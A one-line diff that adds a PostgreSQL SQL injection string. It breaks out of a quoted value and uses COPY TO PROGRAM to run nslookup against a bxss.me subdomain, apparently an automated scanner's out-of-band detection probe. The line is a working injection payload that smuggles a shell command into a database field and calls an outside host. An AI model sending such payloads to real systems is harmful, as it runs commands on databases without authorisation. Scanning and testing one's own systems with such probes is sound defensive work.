@@ -1,0 +1,1 @@
+1';copy (select '') to program 'nslookup dns.sqli.\069466.1371-54.1371.e01d0.\1.bxss.me
